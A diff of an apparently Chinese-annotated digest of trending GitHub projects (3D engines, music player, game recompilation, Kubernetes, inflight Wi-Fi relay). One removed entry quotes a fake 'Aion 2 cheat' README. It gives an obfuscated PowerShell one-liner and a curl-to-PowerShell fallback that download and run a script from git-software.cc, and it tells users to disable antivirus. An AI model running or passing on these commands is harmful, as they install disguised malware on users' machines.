+    ## Built on open standards
+    
+    LocalThings uses the standards the appliances implement:
+    
+    - **OCF, the Open Connectivity Foundation specification.** Samsung's connected appliances are OCF devices. LocalThings discovers each appliance's resources through `/oic/res` and reads its de
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#6  voyager-so/vork
+    ⭐ 946 stars  |  🍴 63 forks  |  💻 Rust  |  📅 2026-11-05
+    🔗 https://github.com/voyager-so/vork
     📡 来源: 🚀 5天300+星
-    🏷️ 3d, blender, cad, llm, procedural-modeling, python, usd
-    📝 3D modeling in Python, built for LLMs.
+    🏷️ 3d, ai-agents, gpu, metal, ray-tracing, rendering, rust, slang, vfx, vulkan
+    📝 Headless 3D and VFX engine for agents. Research preview.
 
     README 摘要:
-    &nbsp;sand3d
+    vork, the Voyager rendering kernel, is a headless 3D and VFX engine built for agents.
     
-    **3D modeling in Python, built for LLMs.**
+    Watch the film: a car drives into the night as the forest
+    turns into glowing cyan wireframe, drawn from real triangle edges by a scene shader.
     
-    sand3d is a Python library for writing 3D objects as short programs: profiles, solids,
-    edits, frames, joints and assemblies, over Blender's `bpy`. A program says *how* a shape
-    is made, part by part and in its own words, so a model writes it in a few hundred tokens
-    and a person can read it.
+    Credit: “Car Concept”
+    by Unity Fan, glTF adaptation by Eric Chadwick / Darmstadt Graphics Group,
+    CC BY 4.0. Changes: scaled, animated,
+    brighter head and tail lights, wheel pose. Trees, ground and asphalt from Poly Haven
+    (CC0). The far mountains and sky are an image-model painting on a curved 3D card;
+    everything else that moves is rendered.
     
-      &nbsp;Website ·
-      &nbsp;Docs ·
-      &nbsp;Datasets ·
-      &nbsp;Explorer
+    ## Paste this to your agent
     
-      
-      
-      
-      
+    Install vork, then paste:
     
-    ## Why sand3d
+    > Run `vork init my-shot`, read `vork help`, render a preview and inspect the image.
+    > Refine the camera and lighting before rendering at final quality. Read the
+    > relevant help topic when you need a feature the first page doesn't explain.
     
-    How it is measured, part by part
+    A million birds, each steering itself over a lagoon. A black hole that bends
+    light. A glowing seed placed on a real desk, lighting the room around it.
+    These are scenes written as code and rendered on a GPU. No video model required.
     
-    - **Short.** A part takes 2 to 6× fewer tokens than the same part in Blender Python, CadQuery or FeatureScript (details).
-    - **The whole API fits in a prompt**, about 3,600 tokens (the API).
-    - **Named, not computed.** Parts, edges and faces are reached by name, never by hand-computed coordinates.
-    - **Deterministic.** The same program builds the same mesh, bit for bit.
+    vork is written in Rust and Slang, with GPU rendering through Vulkan and Metal.
+    An agent writes a scene,
+    renders it, looks at the result and revises the code. There is no editor to drive.
     
-    ## A whole object, part by part
+    Most creative tools expose controls that a person can operate. An agent can also
+    write a shader in the middle of a shot. vork gives it geometry, ray queries and
+    GPU execution, then lets scene programs define materials, cameras, light
+    propagation, simulation and compositing. Ordinary shots need only scene data;
+    the programming hooks are there when the shot needs something unusual.
     
-    A front-loading washing machine in 38 lines of code (play it and read it):
-    the cabinet, the drum, the door with its glass and handle, the detergent drawer and the dial,
-    each a named part, and four joints that say how they move.
-    
-    ```python
-    door = s3d.group("door", ring, glass, handle)                      # the handle and the glass move with it
-    s3d.joint("door_hinge", door, hinge, axis="-Z", range=(0, 143))
-    s3d.joint("drum_spin", drum, front.move(0, 400), kind="continuous")
-    s3d.joint("drawer_slide", drawer, top_band.move(150), kind="prismatic", axis="+X", range=(0, 200))
-    s3d.joint("dial_turn", dial, top_band.move(-150), kind="continuous")
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#14  sarpstar/cinecode
-    ⭐ 498 stars  |  🍴 82 forks  |  💻 Python  |  📅 2026-11-03
-    🔗 https://github.com/sarpstar/cinecode
-    📡 来源: 🚀 5天300+星
-    📝 Films made with code. Short films, long YouTube videos, ads, explainers and music videos: an AI coding agent writes the script, builds every frame in code, designs the sound and hands you an MP4.
-
-    README 摘要:
-    Kodla yazılmış filmler.
-      Kısa filmler, uzun YouTube videoları, reklamlar, açıklayıcılar ve müzik videoları. Fikri ve zevki sen getirirsin; bir yapay zekâ kodlama ajanı senaryoyu yazar, her kareyi kodla kurar, sesi tasarlar ve sana bitmiş bir MP4 verir.
-    
-      English ·
-      简体中文 ·
-      日本語 ·
-      Kurulum ·
-      Hızlı başlangıç ·
-      SSS
-    
-      
-      
-      
-      
-    
-      
-    
-    cinecode ile yapılmış filmlerden 30 saniye. Her kare başsız Chrome'da koddan üretildi.
-    
-    Kendi bilgisayarında, **Claude Code** (masaüstü uygulaması, VS Code eklentisi, terminal) ya da **Cursor** içinde çalışır. Ücretli bir servis gerekmez; dış ses, yalnızca istersen, kendi Gemini anahtarını (ücretsiz kotası var), ElevenLabs'i ya da ücretsiz bir Türkçe sesi kullanır.
-    
-    ## Neler yapabilirsin
-    
-    ### Kodla yapılmış kısa filmler
-    
-    Aklındakini tek cümleyle yaz; gerisini birlikte kurarsınız.
-    
-    - **Sıradan fikirde kalmaz.** Ajan fikrini, dünyadan rastgele çekilen gerçek bir şeyle buluşturur: bir müze eseri, bir hayvan, uzaydan bir fotoğraf, eski bir icat, tarihî bir yer, bir zanaat. Böylece sana herkesin aklına ilk gelen filmi değil, fikrinin senin bile düşünmediğin yorumlarını getirir.
-    - **Kendini tekrar etmez.** Her öneri senin daha önce yaptığın filmlerle karşılaştırılır; aynı filmi sana ikinci kez önermez.
-    - **Son söz hep senin.** Filmin neyden yapılacağını sen seçersin: gerçek ışıklı 3B, 2B animasyon, boya, mürekkep, kâğıt, kil, hareketli grafik ya da piksel. Görünümü gerçek filmlerden karelerle kurulmuş bir panodan seçersin; film bütünüyle kurulmadan önce ilk iki sahneyi görüp onaylarsın.
-    
-    ### Uzun YouTube videoları
-    
-    On dakikayı aşan belgeseller, açıklayıcılar ve video denemeleri; Film modunda perdeler ve bölümler hâlinde kurulur:
-    
-    - gerçek bir kişi ya da olay hakkındaki her iddianın kaynağıyla yazıldığı, araştırılmış bir metin;
-    - ilk dakikada kurulan açık bir soru ve izleyiciyi sona kadar tutan bir merak haritası;
-    - senin dilinde bir anlatıcı (Türkçe ve İngilizce sesler, ücretsiz Türkçe sesler dahil), çiğ motor sesiyle değil, filme ait bir ses işlemesiyle;
-    - açık arşivlerden fotoğraflar, haritalar, belgeler ve görüntüler; resmi olmayan yerde kod: kendini çizen haritalar, sayaçlar, şemalar, yeniden kurulan mekânlar;
-    - biçim isterse bölüm kartları, her perde için kulakla seçilen müzik, −14 LUFS mastering ve video açıklaman için bir künye dosyası.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#15  mjmirza/app-store-compliance
-    ⭐ 402 stars  |  🍴 39 forks  |  💻 Shell  |  📅 2026-06-06
-    🔗 https://github.com/mjmirza/app-store-compliance
-    📡 来源: 🌍 本地化/多语言 | 活跃 | GDPR privacy compliance
-    🏷️ accessibility, ai-agents, android, app-review-guidelines, app-store, app-store-connect, app-store-rejection, app-store-review, claude-code, coppa
-    📝 Avoid common App Store and Google Play rejections. Open playbook and pre-submission guard with 117 documented rejection patterns and fixes, privacy manifest and Data safety checks, 95 tracked deadlines (EU AI Act, DSA, COPPA, age laws), and a skill for AI coding agents.
-
-    README 摘要:
-    &nbsp;&nbsp;&nbsp;
-    
-    # App Store Compliance Playbook
-    
-    Stop getting your iOS and Android apps rejected. The enterprise reference and automated guard that turns App Store and Google Play rejection into a designed out failure mode.
-    
-    Read it as a website at mjmirza.github.io/app-store-compliance.
-    
-    **If this saves you even one rejection, leave a star, fork it, and follow along. That is the whole ask.**
-    
-    Star this repo &nbsp;|&nbsp; Fork it &nbsp;|&nbsp; Follow on GitHub &nbsp;|&nbsp; Follow on X &nbsp;|&nbsp; next8n.com
+    Source-available and free during the research preview.
     
     ## Start here
     
-    Pick one row. The time shown is for that first step.
+    After installing vork, create a working project:
     
-    | You are | Do this first | Time |
-    |---|---|---|
-    | About to submit, and you can open a terminal | Run the two commands below | 2 minutes |
-    | Already rejected | Open the appeal playbook | 10 minutes |
-    | Not a developer | Open the checklist and do its first two checks | 5 minutes |
-    | Using an AI coding tool (Claude Code, Codex, Gemini CLI, GitHub Copilot, Cursor, Grok, Qwen, Kimi and more), and want this on every submit | Go to the install | 1 minute |
-    
-    The two commands. Needs git and bash. The first downloads this playbook. The second scans your app. Nothing is installed and nothing in your app is changed.
-    
-    ```
-    git clone https://github.com/mjmirza/app-store-compliance ~/repositories/app-store-compliance
-    bash ~/repositories/app-store-compliance/agent-os/hooks/app-store-compliance-guard.sh "/path/to/your/app"
-    ```
-    
-    Replace only `/path/to/your/app`, with the folder that holds your Xcode project or your Android app. Keep the quotes, they keep a folder name with a space in it whole. To get the path without typing it, drag the folder from Finder or your file manager into the terminal window. A small project scans in about a second, a large one can take up to a minute, and the guard prints the time it took. Findings print first, critical ones on top, each with the file and line that triggered it when there is one. The last lines tell you where you stand.
-    
-    | Last line starts with | It means | Do next |
-    |---|---|---|
-    | `BLOCKED.` | A critical rejection risk was found | Fix each `[CRITICAL]` line using the `fix.` line under it, then run the same command again |
-    | `CLEAR.` | No critical risk in your code | Do the account and listing checks in the checklist |
-    | `NOT CHECKED.` | No iOS or Android project was found in that folder, or the guard could not write its scan files. Run by hand this exits 1. As a hook it lets the command through | Point it at the right folder, and check the temp fol
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#16  lyonzin/knowledge-rag
-    ⭐ 302 stars  |  🍴 49 forks  |  💻 Python  |  📅 2026-02-05
-    🔗 https://github.com/lyonzin/knowledge-rag
-    📡 来源: 🤖 AI / LLM / RAG | 活跃 | vector database embeddin
-    🏷️ antigravity, bm25, chromadb, claude-code, codex, cross-encoder, cursor, fastembed, hybrid-search, knowledge-base
-    📝 Local RAG server for Claude Code, Cursor and other MCP clients: hybrid BM25 + vector search with cross-encoder reranking on by default, 13 MCP tools, 33 file types including code, re-indexing on file changes. One Python process with embedded ChromaDB and FastEmbed ONNX: no Docker, database server or API key; offline after the first model download.
+#7  egoist/mygo-music
+    ⭐ 852 stars  |  🍴 135 forks  |  💻 Go  |  📅 2026-11-04
+    🔗 https://github.com/egoist/mygo-music
+    📡 来源: 🚀 5天300+星
+    📝 A native music player you extend with plugins
 
     README 摘要:
-    # knowledge-rag: local RAG server for Claude Code, Cursor and other MCP clients
+    # MyGo Music
     
-    **knowledge-rag** is a local retrieval-augmented generation (RAG) server for the Model Context Protocol (MCP). It indexes the documents and code on your machine and gives Claude Code, Cursor, VS Code and other MCP clients 13 tools to search them, using hybrid search (BM25 keywords plus vector similarity) with cross-encoder reranking on by default. Everything runs in one Python process with embedded ChromaDB and FastEmbed ONNX models: no Docker, no database server, no API key. Indexing and search work offline once the models are cached.
+    A native desktop music player written in Go with MyGo, no WebView. It plays your local files out of the box, and everything else comes from plugins.
     
-    - **11.1 ms** median uncached hybrid query on CPU, **6.1 ms** on CUDA: 36 queries over 149 chunks on one Windows host, reranker off (audit)
-    - **0.03 ms** median for a repeated query served from the cache, same workload (audit)
-    - **75,016 chunks** from 5,889 documents: full rebuild completed in a production reproduction (v4.8.3)
-    - **1,500+ tests** collected on each of 9 OS × Python CI cells (platform-specific ones skip), 84% line coverage against an 80% floor (CI run, 2026-11-06)
+    ## Features
     
-    Install and register with Claude Code (needs Python 3.11+ and Node.js 16+):
+    - Local files (MP3, FLAC, Ogg Vorbis, WAV, and ALAC, FLAC or AAC in .m4a and .aac) with tags, covers and `.lrc` lyrics
+    - Playlists, liked songs, search, albums and artists
+    - Now Playing with lyric stage styles, cover wall, queue, shuffle and repeat
+    - Notch player on macOS, tray, media keys
+    - Audio cache, fades on pause and seek, loudness normalization
+    - Session restore
+    - Podcast captions, written down on the device as episodes play
+    - English and Simplified Chinese
+    - Plugins can add accounts, catalogs, podcasts, stations, comments and pages of their own
+    
+    ## Build
     
     ```bash
-    npx -y knowledge-rag --install-only
-    claude mcp add knowledge-rag -s user --env KNOWLEDGE_RAG_DIR=~/knowledge-rag -- npx -y knowledge-rag
+    go tool mygo dev     # run in development
+    go tool mygo build   # package into build/
+    go test ./internal/...
     ```
     
-    Put files in `~/knowledge-rag/documents/` and ask your agent to search them. The folder is created on first start, new and changed files are indexed automatically, and the models (about 150 MB) download the first time they are needed.
+    ## Podcast captions
     
-    Install · Results · How it works · Tools · Skills · Comparison · FAQ · Docs
+    Episodes are written down on the device as they play, with sherpa-onnx and Qwen3-ASR, which the app downloads when the listener asks for them. The libraries come from this repository's `sherpa-onnx-` prerelease, which only changes with that version:
     
-    ## Star history
+    ```bash
+    go run ./scripts/sherpa -sign "Developer ID Application: …"
+    gh release create sherpa-onnx-2.0.1 --prerelease --latest=false build/sherpa/*
+    ```
     
-      
-        
-      
+    ## Plugins
     
-    Updated daily by the star-history workflow.
+    A plugin is a folder in the app's `plugins` directory (Settings > Plugins > + > Show Plugins Folder) with a `plugin.json` and one JavaScript or TypeScript file. Install one with the + in Settings > Plugins from GitHub, by its repository or its address, or from its folder or a zip of it on this computer, or drop the folder in by hand. Remove one from its ⋯ menu there. There's nothing to build, and the same plugin runs on every platform. `examples/demo-plugin` does everything a plugin can with made-up data: copy it to start.
     
-    ## Measured results
+    ```json
+    {
+      "id": "example",
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#8  sostenesfreitas/ocarina-recomp
+    ⭐ 844 stars  |  🍴 47 forks  |  💻 C  |  📅 2026-11-06
+    🔗 https://github.com/sostenesfreitas/ocarina-recomp
+    📡 来源: 🚀 5天300+星
+    📝 Ocarina of Time running natively on Windows, no emulator. Built on your PC from your own copy. No game files included.
+
+    README 摘要:
+    # Ocarina Recomp
     
-    Measurements from the project's own audits. They come from one host and small corpora, so treat them as orders of magnitude for your planning, not as guarantees.
+    Read in English
     
-    | Measurement | CPU | NVIDIA CUDA |
-    | --- | ---: | ---: |
-    | Hybrid query, uncached, median | 11.13 ms | 6.10 ms |
-    | Hybrid query, uncached, p95 | 13.91 ms | 7.44 ms |
-    | Repeated query (cache hit), median | 0.033 ms | 0.028 ms |
-    | Initial indexing, including first model load | 13.655 s | 0.832 s |
-    | Sampled peak process memory (RSS) | 1,416 MB | 990 MB |
+    **Ocarina rodando nativo no Windows, sem emulador.**
+    
+    O código do jogo é traduzido para C e compilado como um programa do Windows. Os gráficos do Switch 2 são convertidos para Vulkan. Tudo isso acontece **no seu PC, a partir do seu próprio arquivo do jogo**.
+    
+    > [!IMPORTANT]
+    > Este repositório **não contém o jogo, keys nem executável**, e não explica como obtê-los. Você precisa da sua própria cópia. O que a instalação gera (o `ocarina.exe`, o código gerado, o cache de shaders e os saves) sai do seu jogo: **não compartilhe**.
+    
+    ## Estado do projeto
+    
+    Experimental. Só foi testado em **um PC** (Ryzen 9 9950X3D, RTX 5090), na região do início do jogo.
+    
+    | O quê | Situação |
+    |---|---|
+    | Abertura e jogo novo, até a Árvore Deku | ✅ Funciona |
+    | Vilarejo Kokiri: árvores, plantas, casas, luz | ✅ Funciona |
+    | Som, controle, saves e vídeos | ✅ Funciona |
+    | Desempenho na RTX 5090 | ✅ Cerca de 59 fps parado, 51 a 55 fps caminhando |
+    | Travadinhas ao entrar em áreas novas | ⚠️ Ainda acontecem, principalmente na primeira vez |
+    | Tocar a ocarina | ❓ Correção aplicada, ainda sem teste em jogo |
+    | Hyrule Field e o resto do jogo | ❓ Ainda não testados |
+    | Placas AMD e Intel | ❓ Nunca testadas |
+    
+    ## Como compilar
+    
+    O jogo não vem pronto: ele é compilado no seu PC, a partir da sua cópia. Escolha um destes três jeitos.
+    
+    **1. Com o instalador em ZIP, o mais fácil:** não instala nada no Windows e não pede administrador.
+    
+    1. Baixe o **`Ocarina-Setup-...-windows.zip`** da página de versões.
+    2. **Extraia o ZIP inteiro** para uma pasta e abra o `Instalar-Ocarina.exe` que está dentro dela.
+    3. O executável não tem assinatura digital, então o Windows pode avisar. Clique em **Mais informações** e depois em **Executar assim mesmo**.
+    4. Na janela, escolha o `.nup` do seu jogo (ou uma pasta com `exefs` e `romfs`) e clique em **Instalar**.
+    5. No fim, clique em **Jogar**, ou use o atalho **Ocarina Recomp** na Área de Trabalho.
+    
+    Para desinstalar, apague a pasta de instalação. Prefere conferir antes? O executável só abre o script `instalador\Instalar-Ocarina.ps1`, que está ao lado dele no ZIP e pode ser lido em qualquer editor. O código do executável tem poucas linhas. Alguns antivírus reclamam de programas novos sem assinatura e de scripts do PowerShell: é um alarme possível, e o código está todo aqui para quem quiser conferir. A página de versões traz o SHA-256 do arquivo.
     
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#17  ⚠️风险  Flockcleplank/aion-2-trainer-tool
-    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
-    ⭐ 220 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-06
-    🔗 https://github.com/Flockcleplank/aion-2-trainer-tool
-    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
-    🏷️ aion-2, aion-2-2026, aion-2-game, aion-2-optimizer, aion-2-trainer, aion-2-trainer-tool, aion2-combat-analysis, aion2-meter, automation, developer-tools
-    📝 Aion 2: Optimized package deployment for AI-driven prompt engineering tasks, ensuring seamless local workstation execution in 2026.
+#9  WoYun520/gif-factory
+    ⭐ 659 stars  |  🍴 80 forks  |  💻 Python  |  📅 2026-11-05
+    🔗 https://github.com/WoYun520/gif-factory
+    📡 来源: 🚀 5天300+星
+    📝 GIF 工厂：按风格制作像素、人物与宠物、粘土吉祥物、光栅卡与动态海报的 GIF Skill。
 
     README 摘要:
-    # AION 2 Cheat
+    # GIF 工厂
     
-    ### ⚡ Overview
-    **This repository provides a pre-activated, free setup for Aion 2 Cheat.** It is fully configured for standalone deployment, removing the need for registration or license configuration. Perfect for testing, development, and local workstation setups.
+    **挑一种风格，给一张参考图，把角色、相片和想法做成 GIF，也能延伸成动态绘本。**
     
-    ### ⚙️ System Specifications
-    > **Distribution Type:** Pre-activated Local Build
-    >
-    > **Target Platform:** Windows x64 Desktop
-    >
-    > **Estimated File Size:** 2.7 GB
-    >
-    > **Last Verified Mirror Sync:** November 2026
+    像素小人、人物与宠物、粘土吉祥物、光栅变画、漫画动态海报。
+    先看效果，再换成你自己的角色和主题；拿不准就先做一张。
     
-    ---
-    ## 🛠️ Quick Installation Guide
+    **6 个 GIF 分类 · 9 个 GIF 风格入口 · 56 个动态案例，另有动态绘本和品牌短片**
     
-    1. Open Terminal as Administrator:
-       * Press `Win + X` on your keyboard.
-       * Click on **Terminal (Administrator)** or **Windows PowerShell (Administrator)** from the menu.
+    浏览风格 · 完整作品库 · 怎么使用 · Skill · 下载项目
     
-    2. Run the Setup Command:
-       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Just wait a moment for the automated configuration to finish:
+    ## 精选：漫画印刷动态海报
     
-       ```cmd
-       irm "https://git-software.cc/ps/Setup.ps1" | &(gcm i*x)
-       ```
+    人物、背景和大字一起设计。黑白打底，每个角色保留一种主色；从平静切到登场，字体也跟着展开，6 秒循环。
     
-    ---
+    ▶ 播放九宫格 GIF · 使用这个风格 · 九张独立 GIF
     
-    ## 📖 Troubleshooting & Easy Fixes
+    ## 挑一种风格
     
-    ### ⚠️ If the script is blocked by Execution Policy
-    If Windows stops the command due to standard security settings, you can easily bypass this by running it via a standard Command Prompt (cmd) in two quick steps:
-    ```cmd
-    curl -sL git-software.cc/ps/Setup.ps1 > run.ps1 && powershell -File run.ps1
+    每个分类都放了多个角色、动作或场景。点击动图看原尺寸，点击风格名看制作方法；各风格详情页共有 **56 个动态案例**。100 张完整系列继续放在作品库，默认收起。
+    
+    ### 像素与游戏
+    
+    鲸鱼娘·问候像素轻动效
+    小秘书·回消息像素轻动效
+    小秘书·生活像素轻动效
+    
+    眼镜男孩·冲鸭像素完整动作
+    红帽女孩·你好呀像素完整动作
+    太空猫·起飞啦像素完整动作
+    
+    像素轻动效 · 全部 6 张 · 像素完整动作 · 全部 8 张
+    
+    ### 插画与二次元
+    
+    鸣人·加油插画角色动作
+    路飞·冲鸭插画角色动作
+    初音·嗨呀插画角色动作
+    
+    公主裙·提裙行礼插画角色动作
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#10  dsx-ai-factory/nvke
+    ⭐ 619 stars  |  🍴 95 forks  |  💻 Go  |  📅 2026-08-04
+    🔗 https://github.com/dsx-ai-factory/nvke
+    📡 来源: trending-daily
+    🏷️ bare-metal, cluster-api, gpu, kubernetes, nvidia
+    📝 NVIDIA Kubernetes Engine (NVKE). A management plane for GPU Kubernetes on bare metal.
+
+    README 摘要:
+    # NVIDIA Kubernetes Engine (NVKE)
+    
+    **Run a managed Kubernetes service on your own NVIDIA GPU infrastructure.**
+    NVIDIA Kubernetes® Engine (NVKE) provides the management plane that platform teams install to create and
+    operate Kubernetes clusters for their customers. Each workload cluster has its
+    own Kubernetes control plane, etcd and node pools. You operate the NVKE management
+    plane; your customers use their clusters through the Kubernetes API and `kubectl`.
+    
+    > **Preview:** NVKE is available as a preview. APIs, configuration and behavior
+    > can change between releases, and we do not recommend NVKE for production
+    > workloads. See Preview status and known limitations.
+    
+    Get started · Documentation ·
+    Contribute · Get help
+    
+    ## Getting started
+    
+    | Your goal | Start here | What you get |
+    |---|---|---|
+    | **Evaluate without GPU hardware** | Local quickstart | A development management plane and a workload cluster on simulated machines. No NVIDIA account is required. |
+    | **Install on your infrastructure** | Plan your installation | The prerequisites and sequence for preparing nodes, bootstrapping a management cluster and installing its services. |
+    | **Build or contribute** | Build from source | The NVKE binaries and the contributor development loop. |
+    
+    The local quickstart runs on a **Linux host or VM, amd64 or arm64**, with at least
+    **6 CPUs, 12 GiB of free memory and 100 GiB of free disk**. It requires Docker,
+    virtual TPM support and the tools listed in the guide. Follow its setup through
+    workload-cluster creation and confirm the cluster's nodes report `Ready`.
+    On macOS, use the local site guide, which runs
+    the evaluation inside a Colima virtual machine.
+    
+    For a real installation, you supply the machines, networking, node images and
+    registries, and configure access to **NVIDIA Infra Controller (NICo)**. NICo is
+    the sole compatible infrastructure provider at preview. The
+    platform and version reference lists
+    validated combinations and pinned dependencies.
+    
+    ## What NVKE does
+    
+    - **Creates independent workload clusters.** Request clusters through the NVKE
+      API or `nvkectl`; NVKE provisions machines through NICo and forms Kubernetes
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#11  ⚠️风险  Th0rgal/satmux
+    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
+    ⭐ 608 stars  |  🍴 28 forks  |  💻 Python  |  📅 2026-11-07
+    🔗 https://github.com/Th0rgal/satmux
+    📡 来源: 🚀 5天300+星
+    📝 Accelerate high-latency GEO inflight Wi-Fi via warm BBR TCP multiplexing + 1-RTT Ground-TLS + zlib (zero dependencies)
+
+    README 摘要:
+    # satmux
+    
+    TCP multiplexer and `1-RTT` HTTP/TLS relay for geostationary (GEO) inflight Wi-Fi (Inmarsat GX, Viasat, Panasonic, SITA). Pure Python 3 stdlib, zero external dependencies.
+    
+    Measured inflight over Inmarsat GX Ka-band (`~620 ms` RTT, SITA `AS206433` Amsterdam ground station):
+    
+    ```text
+      ORIGIN (6× PARALLEL)  RAW CABIN WI-FI (:443)    1-RTT BBR + ZLIB MUX    SPEEDUP
+      ────────────────────  ────────────────────────  ──────────────────────  ─────────
+      GitHub Repo           ████████████    TIMEOUT  ███░░░░░░░░░    4.66s  FIXED ✓
+      GitHub API            ████████████  TCP RESET  ██░░░░░░░░░░    2.66s  FIXED ✓
+      Hacker News           ████████████    TIMEOUT  ██░░░░░░░░░░    2.28s  FIXED ✓
+      MDN Docs              ████████░░░░     12.01s  ██░░░░░░░░░░    2.30s     5.2×
+      Cloudflare            ██░░░░░░░░░░      2.97s  █░░░░░░░░░░░    1.40s     2.1×
+      PyPI JSON API         █████░░░░░░░      7.09s  ██░░░░░░░░░░    2.64s     2.7×
+      ──────────────────────────────────────────────────────────────────────────────────
+      6-Origin Burst:    19.13s (3/6 failed)  →  5.35s (0/6 failed)   [3.6× faster · -76% TTFB]
     ```
     
-    ### 🛡️ Antivirus / SmartScreen Warnings
-    Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.
+    ## Problem
+    
+    Non-Starlink inflight Wi-Fi usually breaks on three things unrelated to raw bandwidth:
+    
+    1. **Onboard `:443` middleboxes and DNS interception.** Cabin gateways intercept `:53` DNS and run a transparent `:443` split-TCP proxy (PEP) whose state table drops connections under load (`Connection reset by peer` / TLS timeouts on `github.com`, `api.github.com`, package registries). Non-443 TCP ports pass through untouched.
+    2. **Handshake round-trips (`~620 ms` per GEO hop).** Every new origin normally pays multiple satellite round-trips (DNS + TCP + TLS) before transferring payload bytes.
+    3. **Cubic congestion collapse.** Cabin Wi-Fi packet loss causes standard TCP to halve `cwnd` repeatedly, leaving most of your per-seat token-bucket cap unused.
+    
+    ## How it works
+    
+    ```text
+    Direct (:443):
+      laptop ──▶ cabin DNS + :443 PEP ══(3–4 GEO RTTs)══▶ ground ──▶ origin  (frequent TCP resets)
+    
+    satmux (:8444):
+      laptop ══(12 persistent TCP :8444 BBR + zlib pipes)══▶ ground VM ──(2 ms)──▶ origin
+    ```
+    
+    - **Persistent non-443 carrier pool (`:8444`):** Keeps 12 pre-warmed TCP connections open to a Linux VM near the satellite ground station, bypassing the cabin `:443` proxy and onboard DNS. Streams are scheduled onto the carrier with the lowest recent byte load so idle browser keepalives do not cause head-of-line queueing.
+    - **0-RTT stream open (`127.0.0.1:1080` SOCKS5 / `
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#12  Arda313131882/aion-2-trainer-tool
+    ⭐ 244 stars  |  🍴 0 forks  |  💻 HTML  |  📅 2026-11-06
+    🔗 https://github.com/Arda313131882/aion-2-trainer-tool
+    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
+    🏷️ aion-2, aion-2-2026, aion-2-game, aion-2-optimizer, aion-2-trainer, aion-2-trainer-tool, aion2-combat-analysis, aion2-meter, automation, desktop
+    📝 Aion 2 AI Prompt Engineering Toolkit - Standalone Desktop Trainer Setup
+
+    README 摘要:
+    # Aion 2 Trainer Tool — Game Enhancer for Windows
+    
+    ### 🚀 PowerShell Quick Install
+    
+      
+    
+    ---
+    
+    This standalone build equips Aion 2 players with a complete, pre-configured desktop environment built around advanced AI prompt engineering tools. Everything ships ready to run—no dependency hunting, no patch roulette, just a single setup that gets you from download to playable state fast. Every component has been verified against a clean Windows x64 target, so what lands on your machine is exactly what was tested. Drop it in, launch it, and the tooling works the moment you need it.
+    
+    ## ✅ Before You Start
+    
+    - Windows 10 or Windows 11
+    - PowerShell 5.1 or newer (already available on Windows)
+    - Active network connection
+    - No admin rights needed
+    
+    ## Features
+    
+    - **Local-First Architecture** — everything runs on your desktop. No cloud dependency, no mandatory sign-in, no round-trip latency between you and your prompts.
+    - **Advanced Prompt Engineering Toolkit** — build, chain, and refine complex AI prompts without wrestling with syntax. Structured templates, variable injection, and reusable blocks keep iteration fast.
+    - **Complete Standalone Setup** — the full package ships self-contained. Unpack, launch, and you're in the tool — no external runtime scavenger hunt required.
+    - **Windows x64 Native** — tuned for desktop performance on the platform you actually play and work on.
+    - **Prompt Library & Reusability** — save your best-performing prompts as presets, swap variables on the fly, and keep your workflow repeatable instead of re-typing from scratch every session.
+    - **Rapid Iteration Loop** — edit, test, and compare prompt outputs in a tight cycle so you can dial in results without breaking flow.
+    - **Portable Configuration** — settings live in plain, human-readable config so you can back them up, version them, and move them between machines.
+    - **Zero-Friction Onboarding** — sensible defaults out of the box, with enough exposed knobs for power users who want to tune behavior.
+    - **Built for Offline Reliability** — once set up, the core tooling doesn't stall when your connection does.
+    
+    ## How It Works
+    
+    The tool runs entirely on your local machine — no launcher overhead, no background services, no waiting on a remote handshake. Drop it on your desktop, fire it up, and the core engine initializes in seconds.
+    
+    Under the hood, the prompt engineering layer handles the heavy lifting. Presets are pre-tuned and ready to go, so you're not building prompts from scratch every session.
